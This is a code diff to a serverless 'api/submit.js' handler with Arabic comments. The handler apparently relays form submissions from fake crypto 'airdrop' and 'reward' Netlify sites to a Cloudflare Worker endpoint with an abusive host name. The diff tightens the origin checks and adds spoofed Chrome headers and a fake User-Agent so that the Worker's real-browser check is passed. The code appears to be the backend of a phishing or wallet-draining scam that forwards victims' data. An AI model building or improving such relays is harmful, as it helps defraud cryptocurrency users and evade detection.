@@ -1,6 +1,5 @@
 // api/submit.js
 
-// الأصول المسموح بها
 const ALLOWED_ORIGINS = [
   "https://big-airdrop.netlify.app",
   "https://reward-ethdefreum.netlify.app",
@@ -15,15 +14,12 @@ const ALLOWED_ORIGINS = [
 
 const WORKER_URL = "https://1fuckurmotherhahahahahahaha.eth2-stiffness640.workers.dev/";
 
-// استخراج origin من الـ Referer
 function originFromReferer(referer = "") {
   try {
     if (!referer) return "";
     const u = new URL(referer);
     return `${u.protocol}//${u.host}`;
-  } catch {
-    return "";
-  }
+  } catch { return ""; }
 }
 
 function corsHeaders(origin) {
@@ -40,7 +36,7 @@ export default async function handler(req, res) {
   const referer = req.headers.referer || "";
   const derivedOrigin = reqOrigin || originFromReferer(referer);
 
-  // DEBUG GET: لو فتحت الرابط في المتصفح مباشرة
+  // GET للتشخيص فقط
   if (req.method === "GET") {
     return res.status(200).json({
       origin: reqOrigin || null,
@@ -52,14 +48,14 @@ export default async function handler(req, res) {
 
   // Preflight
   if (req.method === "OPTIONS") {
-    if (!ALLOWED_ORIGINS.includes(derivedOrigin)) {
+    if (!derivedOrigin || !ALLOWED_ORIGINS.includes(derivedOrigin)) {
       return res.status(403).json({ error: "Forbidden origin (preflight)", got: derivedOrigin });
     }
     return res.status(200).set(corsHeaders(derivedOrigin)).send("ok");
   }
 
   // السماح فقط بـ POST ومن أصل مسموح
-  if (!ALLOWED_ORIGINS.includes(derivedOrigin)) {
+  if (!derivedOrigin || !ALLOWED_ORIGINS.includes(derivedOrigin)) {
     return res.status(403).json({ error: "Forbidden origin", got: derivedOrigin });
   }
   if (req.method !== "POST") {
@@ -67,13 +63,25 @@ export default async function handler(req, res) {
   }
 
   try {
-    // تمرير الطلب للـ Worker مع origin الصحيح
+    // رؤوس “متصفح حقيقية” لإرضاء isLikelyRealBrowser في الـWorker
+    const browserLikeHeaders = {
+      "Content-Type": "application/json",
+      "Accept": "application/json,text/html;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
+      "Sec-Fetch-Mode": "cors",
+      "Sec-Fetch-Site": "same-origin",
+      'sec-ch-ua': '"Chromium";v="139", "Google Chrome";v="139", ";Not A Brand";v="99"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': '"Windows"',
+      // مهم: يمرر Origin لأن الـWorker يتحقق منه
+      "Origin": derivedOrigin,
+      // User-Agent واقعي بدل UA الافتراضي لسيرفر
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+    };
+
     const response = await fetch(WORKER_URL, {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "Origin": derivedOrigin
-      },
+      headers: browserLikeHeaders,
       body: JSON.stringify(req.body)
     });
 
